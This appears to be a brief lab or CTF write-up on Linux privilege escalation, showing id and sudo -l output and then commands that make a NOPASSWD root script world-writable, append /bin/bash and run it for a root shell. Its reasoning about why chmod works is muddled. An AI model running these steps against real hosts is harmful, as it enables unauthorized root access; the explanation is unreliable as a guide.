
When the current user is in (sudo) group.

```
alex@ubuntu:~$ id
uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo)
```

The user is able to run the following script without authentication with root permissions, but has no write access.

```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Since we are part of the sudo group we can use chmod to give write permissions.

```
chmod 777 /etc/mp3backups/backup.sh
```

Add bash shell command to script.

```
echo "/bin/bash" >> /etc/mp3backups/backup.sh
```

Run script and get root shell

```
sudo /etc/mp3backups/backup.sh
```